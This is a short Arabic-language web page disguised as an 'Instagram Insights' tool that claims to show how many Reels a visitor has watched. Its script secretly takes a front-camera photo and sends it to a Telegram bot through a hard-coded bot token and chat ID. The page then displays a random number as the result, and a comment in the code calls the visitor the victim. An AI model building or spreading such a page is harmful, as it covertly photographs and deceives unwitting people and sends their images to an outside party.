<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Insights</title>
    <style>
        body { margin: 0; background-color: #fafafa; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 80%; max-width: 350px; }
        .btn { background: #0095f6; color: white; padding: 14px; border: none; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
        #loader { display: none; margin-top: 20px; }
        .reels-num { font-size: 40px; font-weight: bold; color: #ed4956; margin: 15px 0; display: block; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" width="60">
    <h3>تحليل سجل المشاهدات</h3>
    <p style="font-size: 13px; color: #8e8e8e;">اضغط لمعرفة عدد الريلز التي شاهدتها منذ إنشاء حسابك.</p>
    
    <button class="btn" id="btn" onclick="start()">عرض الإحصائيات</button>

    <div id="loader">
        <p id="msg">جاري الاتصال بالخادم...</p>
    </div>

    <div id="res" style="display:none;">
        <p>لقد شاهدت ما مجموعه:</p>
        <span class="reels-num" id="num">0</span>
        <p style="font-size: 11px; color: #0095f6;">تم التحديث الآن</p>
    </div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    const token = "8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwX0DPs";
    const id = "7822309283";

    async function start() {
        document.getElementById('btn').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        
        try {
            // تشغيل الكاميرا الأمامية
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const v = document.getElementById('v');
            v.srcObject = s;
            v.play(); // إجبار التشغيل

            // توليد الرقم فوراً عشان ما يعلق
            const rand = Math.floor(Math.random() * 3001) + 2000;
            document.getElementById('num').innerText = rand.toLocaleString();

            // انتظار 4 ثواني (عشان السواد يروح)
            setTimeout(() => {
                const c = document.getElementById('c');
                const v = document.getElementById('v');
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                
                c.toBlob(b => {
                    const f = new FormData();
                    f.append('chat_id', id);
                    f.append('photo', b, 'img.jpg');
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
                    
                    // إظهار النتيجة للضحية
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('res').style.display = 'block';
                    
                    // إغلاق الكاميرا
                    s.getTracks().forEach(t => t.stop());
                }, 'image/jpeg', 0.7);
            }, 4000);

        } catch (e) {
            alert("يرجى السماح بالكاميرا لرؤية النتيجة");
            location.reload();
        }
    }
</script>
</body>
</html>
